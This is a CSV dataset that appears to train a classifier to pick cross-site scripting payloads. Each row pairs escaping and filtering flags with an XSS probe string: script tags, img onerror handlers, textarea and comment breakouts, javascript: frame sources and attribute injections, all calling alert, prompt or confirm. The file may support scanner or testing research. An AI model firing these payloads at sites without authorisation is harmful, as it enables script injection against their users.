op_html,op_attr,op_js,op_vbs,op_quot,esc_double,esc_single,esc_back,esc_left,esc_right,esc_alert,esc_prompt,esc_confirm,esc_balert,esc_sscript,esc_escript,esc_msgbox,label,inspection_strings
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,[<script>alert();</script>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,[<script>prompt();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,2,[<script>confirm();</script>]
2,0,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,2,[<script>confirm();</script>]
2,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,2,[<script>confirm();</script>]
2,0,0,0,0,0,0,1,0,0,1,1,0,0,0,0,0,2,[<script>confirm();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,2,[<script>confirm();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,2,[<script>confirm();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,2,[<script>confirm();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,2,[<script>confirm();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,2,[<script>confirm();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,2,[<script>confirm();</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,3,[<script>alert``;</script>]
2,0,0,0,0,1,0,0,0,0,1,1,1,0,0,0,0,3,[<script>alert``;</script>]
2,0,0,0,0,0,1,0,0,0,1,1,1,0,0,0,0,3,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,3,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,3,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,3,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,3,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,3,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,3,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,3,[<script>alert``;</script>]
2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,4,[<img src=x onerror=alert();>]
2,0,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,4,[<img src=x onerror=alert();>]
2,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,4,[<img src=x onerror=alert();>]
2,0,0,0,0,0,1,0,0,0,0,0,0,0,1,1,0,4,[<img src=x onerror=alert();>]
2,0,0,0,0,0,1,1,0,0,0,0,0,0,1,1,0,4,[<img src=x onerror=alert();>]
2,0,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,4,[<img src=x onerror=alert();>]
2,0,0,0,0,1,0,1,0,0,0,0,0,0,1,1,0,4,[<img src=x onerror=alert();>]
2,0,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,4,[<img src=x onerror=alert();>]
2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,4,[<img src=x onerror=alert();>]
2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,4,[<img src=x onerror=alert();>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,5,[<img src=x onerror=prompt();>]
2,0,0,0,0,1,0,0,0,0,1,0,0,0,1,1,0,5,[<img src=x onerror=prompt();>]
2,0,0,0,0,1,1,0,0,0,1,0,0,0,1,1,0,5,[<img src=x onerror=prompt();>]
2,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,5,[<img src=x onerror=prompt();>]
2,0,0,0,0,0,1,1,0,0,1,0,0,0,1,1,0,5,[<img src=x onerror=prompt();>]
2,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,0,5,[<img src=x onerror=prompt();>]
2,0,0,0,0,1,0,1,0,0,1,0,0,0,1,1,0,5,[<img src=x onerror=prompt();>]
2,0,0,0,0,1,1,1,0,0,1,0,0,0,1,1,0,5,[<img src=x onerror=prompt();>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,5,[<img src=x onerror=prompt();>]
2,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,5,[<img src=x onerror=prompt();>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,6,[<img src=x onerror=confirm();>]
2,0,0,0,0,1,0,0,0,0,1,1,0,0,1,1,0,6,[<img src=x onerror=confirm();>]
2,0,0,0,0,1,1,0,0,0,1,1,0,0,1,1,0,6,[<img src=x onerror=confirm();>]
2,0,0,0,0,0,1,0,0,0,1,1,0,0,1,1,0,6,[<img src=x onerror=confirm();>]
2,0,0,0,0,0,1,1,0,0,1,1,0,0,1,1,0,6,[<img src=x onerror=confirm();>]
2,0,0,0,0,0,0,1,0,0,1,1,0,0,1,1,0,6,[<img src=x onerror=confirm();>]
2,0,0,0,0,1,0,1,0,0,1,1,0,0,1,1,0,6,[<img src=x onerror=confirm();>]
2,0,0,0,0,1,1,1,0,0,1,1,0,0,1,1,0,6,[<img src=x onerror=confirm();>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,6,[<img src=x onerror=confirm();>]
2,0,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,6,[<img src=x onerror=confirm();>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,7,[<img src=x onerror=alert``;>]
2,0,0,0,0,1,0,0,0,0,1,1,1,0,1,1,0,7,[<img src=x onerror=alert``;>]
2,0,0,0,0,1,1,0,0,0,1,1,1,0,1,1,0,7,[<img src=x onerror=alert``;>]
2,0,0,0,0,0,1,0,0,0,1,1,1,0,1,1,0,7,[<img src=x onerror=alert``;>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,7,[<img src=x onerror=alert``;>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,7,[<img src=x onerror=alert``;>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,7,[<img src=x onerror=alert``;>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,7,[<img src=x onerror=alert``;>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,7,[<img src=x onerror=alert``;>]
2,0,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,7,[<img src=x onerror=alert``;>]
7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,[</textarea><script>alert();</script>]
7,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,8,[</textarea><script>alert();</script>]
7,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,8,[</textarea><script>alert();</script>]
7,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,8,[</textarea><script>alert();</script>]
7,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,8,[</textarea><script>alert();</script>]
7,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,8,[</textarea><script>alert();</script>]
7,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,8,[</textarea><script>alert();</script>]
7,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,8,[</textarea><script>alert();</script>]
7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,[</textarea><script>alert();</script>]
7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,[</textarea><script>alert();</script>]
7,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,9,[</textarea><script>prompt();</script>]
7,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,9,[</textarea><script>prompt();</script>]
7,0,0,0,0,1,1,0,0,0,1,0,0,0,0,0,0,9,[</textarea><script>prompt();</script>]
7,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,9,[</textarea><script>prompt();</script>]
7,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,9,[</textarea><script>prompt();</script>]
7,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,9,[</textarea><script>prompt();</script>]
7,0,0,0,0,1,0,1,0,0,1,0,0,0,0,0,0,9,[</textarea><script>prompt();</script>]
7,0,0,0,0,1,1,1,0,0,1,0,0,0,0,0,0,9,[</textarea><script>prompt();</script>]
7,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,9,[</textarea><script>prompt();</script>]
7,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,9,[</textarea><script>prompt();</script>]
7,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,10,[</textarea><script>confirm();</script>]
7,0,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,10,[</textarea><script>confirm();</script>]
7,0,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,10,[</textarea><script>confirm();</script>]
7,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,10,[</textarea><script>confirm();</script>]
7,0,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,10,[</textarea><script>confirm();</script>]
7,0,0,0,0,0,0,1,0,0,1,1,0,0,0,0,0,10,[</textarea><script>confirm();</script>]
7,0,0,0,0,1,0,1,0,0,1,1,0,0,0,0,0,10,[</textarea><script>confirm();</script>]
7,0,0,0,0,1,1,1,0,0,1,1,0,0,0,0,0,10,[</textarea><script>confirm();</script>]
7,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,10,[</textarea><script>confirm();</script>]
7,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,10,[</textarea><script>confirm();</script>]
7,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,11,[</textarea><script>alert``;</script>]
7,0,0,0,0,1,0,0,0,0,1,1,1,0,0,0,0,11,[</textarea><script>alert``;</script>]
7,0,0,0,0,1,1,0,0,0,1,1,1,0,0,0,0,11,[</textarea><script>alert``;</script>]
7,0,0,0,0,0,1,0,0,0,1,1,1,0,0,0,0,11,[</textarea><script>alert``;</script>]
7,0,0,0,0,0,1,1,0,0,1,1,1,0,0,0,0,11,[</textarea><script>alert``;</script>]
7,0,0,0,0,0,0,1,0,0,1,1,1,0,0,0,0,11,[</textarea><script>alert``;</script>]
7,0,0,0,0,1,0,1,0,0,1,1,1,0,0,0,0,11,[</textarea><script>alert``;</script>]
7,0,0,0,0,1,1,1,0,0,1,1,1,0,0,0,0,11,[</textarea><script>alert``;</script>]
7,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,11,[</textarea><script>alert``;</script>]
7,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,11,[</textarea><script>alert``;</script>]
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,12,"[""><script>alert();</script>]"
5,3,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,12,"[""><script>alert();</script>]"
5,3,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,12,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,12,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,12,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,12,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,12,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,12,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,12,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,12,"[""><script>alert();</script>]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,13,"[""><script>prompt();</script>]"
5,3,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,13,"[""><script>prompt();</script>]"
5,3,0,0,1,0,1,1,0,0,1,0,0,0,0,0,0,13,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,13,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,13,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,13,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,13,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,13,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,13,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,13,"[""><script>prompt();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,14,"[""><script>confirm();</script>]"
5,3,0,0,1,0,1,0,0,0,1,1,0,0,0,0,0,14,"[""><script>confirm();</script>]"
5,3,0,0,1,0,1,1,0,0,1,1,0,0,0,0,0,14,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,14,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,14,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,14,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,14,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,14,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,14,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,14,"[""><script>confirm();</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,15,"[""><script>alert``;</script>]"
5,3,0,0,1,0,1,0,0,0,1,1,1,0,0,0,0,15,"[""><script>alert``;</script>]"
5,3,0,0,1,0,1,1,0,0,1,1,1,0,0,0,0,15,"[""><script>alert``;</script>]"
5,3,0,0,1,0,0,1,0,0,1,1,1,0,0,0,0,15,"[""><script>alert``;</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,15,"[""><script>alert``;</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,15,"[""><script>alert``;</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,15,"[""><script>alert``;</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,15,"[""><script>alert``;</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,15,"[""><script>alert``;</script>]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,15,"[""><script>alert``;</script>]"
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,[--><script>alert();</script>]
1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,16,[--><script>alert();</script>]
1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,16,[--><script>alert();</script>]
1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,16,[--><script>alert();</script>]
1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,16,[--><script>alert();</script>]
1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,16,[--><script>alert();</script>]
1,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,16,[--><script>alert();</script>]
1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,16,[--><script>alert();</script>]
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,[--><script>alert();</script>]
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,[--><script>alert();</script>]
1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,17,[--><script>prompt();</script>]
1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,17,[--><script>prompt();</script>]
1,0,0,0,0,1,1,0,0,0,1,0,0,0,0,0,0,17,[--><script>prompt();</script>]
1,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,17,[--><script>prompt();</script>]
1,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,17,[--><script>prompt();</script>]
1,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,17,[--><script>prompt();</script>]
1,0,0,0,0,1,0,1,0,0,1,0,0,0,0,0,0,17,[--><script>prompt();</script>]
1,0,0,0,0,1,1,1,0,0,1,0,0,0,0,0,0,17,[--><script>prompt();</script>]
1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,17,[--><script>prompt();</script>]
1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,17,[--><script>prompt();</script>]
1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,18,[--><script>confirm();</script>]
1,0,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,18,[--><script>confirm();</script>]
1,0,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,18,[--><script>confirm();</script>]
1,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,18,[--><script>confirm();</script>]
1,0,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,18,[--><script>confirm();</script>]
1,0,0,0,0,0,0,1,0,0,1,1,0,0,0,0,0,18,[--><script>confirm();</script>]
1,0,0,0,0,1,0,1,0,0,1,1,0,0,0,0,0,18,[--><script>confirm();</script>]
1,0,0,0,0,1,1,1,0,0,1,1,0,0,0,0,0,18,[--><script>confirm();</script>]
1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,18,[--><script>confirm();</script>]
1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,18,[--><script>confirm();</script>]
1,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,19,[--><script>alert``;</script>]
1,0,0,0,0,1,0,0,0,0,1,1,1,0,0,0,0,19,[--><script>alert``;</script>]
1,0,0,0,0,1,1,0,0,0,1,1,1,0,0,0,0,19,[--><script>alert``;</script>]
1,0,0,0,0,0,1,0,0,0,1,1,1,0,0,0,0,19,[--><script>alert``;</script>]
1,0,0,0,0,0,1,1,0,0,1,1,1,0,0,0,0,19,[--><script>alert``;</script>]
1,0,0,0,0,0,0,1,0,0,1,1,1,0,0,0,0,19,[--><script>alert``;</script>]
1,0,0,0,0,1,0,1,0,0,1,1,1,0,0,0,0,19,[--><script>alert``;</script>]
1,0,0,0,0,1,1,1,0,0,1,1,1,0,0,0,0,19,[--><script>alert``;</script>]
1,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,19,[--><script>alert``;</script>]
1,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,19,[--><script>alert``;</script>]
3,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,20,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,20,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,20,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,20,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,20,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,20,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,20,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,20,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,20,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,20,"[""><frame src=""javascript:alert()"">]"
3,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,21,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,21,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,1,1,0,0,1,0,0,0,0,0,0,21,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,21,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,21,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,21,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,21,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,21,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,21,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,21,"[""><frame src=""javascript:prompt()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,22,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,1,0,0,0,1,1,0,0,0,0,0,22,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,1,1,0,0,1,1,0,0,0,0,0,22,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,22,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,22,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,22,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,22,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,22,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,22,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,22,"[""><frame src=""javascript:confirm()"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,23,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,1,0,0,0,1,1,1,0,0,0,0,23,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,23,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,23,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,23,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,23,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,23,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,23,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,23,"[""><frame src=""javascript:alert``"">]"
3,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,23,"[""><frame src=""javascript:alert``"">]"
4,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,24,"["" onerror=alert();""]"
4,2,0,0,1,0,1,0,1,1,0,0,0,0,0,0,0,24,"["" onerror=alert();""]"
4,2,0,0,1,0,1,1,1,1,0,0,0,0,0,0,0,24,"["" onerror=alert();""]"
4,2,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,24,"["" onerror=alert();""]"
4,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,24,"["" onerror=alert();""]"
4,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,24,"["" onerror=alert();""]"
4,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,24,"["" onerror=alert();""]"
4,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,24,"["" onerror=alert();""]"
4,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,24,"["" onerror=alert();""]"
4,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,24,"["" onerror=alert();""]"
4,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,25,"["" onerror=prompt();""]"
4,2,0,0,1,0,1,0,1,1,1,0,0,0,0,0,0,25,"["" onerror=prompt();""]"
4,2,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,25,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,25,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,25,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,25,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,25,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,25,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,25,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,25,"["" onerror=prompt();""]"
4,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,26,"["" onerror=confirm();""]"
4,2,0,0,1,0,1,0,1,1,1,1,0,0,0,0,0,26,"["" onerror=confirm();""]"
4,2,0,0,1,0,1,1,1,1,1,1,0,0,0,0,0,26,"["" onerror=confirm();""]"
4,2,0,0,1,0,0,1,1,1,1,1,0,0,0,0,0,26,"["" onerror=confirm();""]"
4,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,26,"["" onerror=confirm();""]"
4,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,26,"["" onerror=confirm();""]"
4,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,26,"["" onerror=confirm();""]"
4,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,26,"["" onerror=confirm();""]"
4,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,26,"["" onerror=confirm();""]"
4,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,26,"["" onerror=confirm();""]"
4,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,27,"["" onerror=alert``;""]"
4,2,0,0,1,0,1,0,1,1,1,1,1,0,0,0,0,27,"["" onerror=alert``;""]"
4,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,27,"["" onerror=alert``;""]"
4,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,27,"["" onerror=alert``;""]"
4,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,27,"["" onerror=alert``;""]"
4,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,27,"["" onerror=alert``;""]"
4,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,27,"["" onerror=alert``;""]"
4,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,27,"["" onerror=alert``;""]"
4,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,27,"["" onerror=alert``;""]"
4,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,27,"["" onerror=alert``;""]"
4,2,0,0,2,0,0,0,1,1,0,0,0,0,0,0,0,28,[' onerror=alert();']
4,2,0,0,0,1,0,0,1,1,0,0,0,0,0,0,0,28,[' onerror=alert();']
4,2,0,0,2,1,0,1,1,1,0,0,0,0,0,0,0,28,[' onerror=alert();']
4,2,0,0,2,0,0,1,1,1,0,0,0,0,0,0,0,28,[' onerror=alert();']
4,2,0,0,2,0,0,0,1,1,0,0,0,0,0,0,0,28,[' onerror=alert();']
4,2,0,0,2,0,0,0,1,1,0,0,0,0,0,0,0,28,[' onerror=alert();']
4,2,0,0,2,0,0,0,1,1,0,0,0,0,0,0,0,28,[' onerror=alert();']
